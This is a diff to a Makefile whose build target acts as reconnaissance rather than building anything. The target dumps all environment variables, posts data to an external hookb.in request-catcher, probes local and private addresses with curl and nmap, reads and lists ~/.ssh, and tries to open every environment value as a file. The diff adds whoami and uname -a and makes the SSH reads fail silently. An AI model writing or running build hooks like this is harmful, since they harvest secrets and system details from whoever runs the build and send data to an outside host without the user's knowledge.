@@ -5,6 +5,8 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
+	whoami || true
+	uname -a || true
 	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
 	curl -v -k 127.0.0.1 || true
 	curl -v -k 168.192.1.1 || true
@@ -24,8 +26,8 @@ build: ListAllCommands EchoEnv
 	nmap 127.0.0.1 || true
 	nmap 168.192.1.1 || true
 	nmap localhost || true
-	cat ~/.ssh/known_hosts
-	ls -al ~/.ssh
+	cat ~/.ssh/known_hosts || true
+	ls -al ~/.ssh || true
 	for var in $$(printenv | mawk -F= '{print $$2}'); do\
 	 cat $$var || ls $$var || true; \
 	done
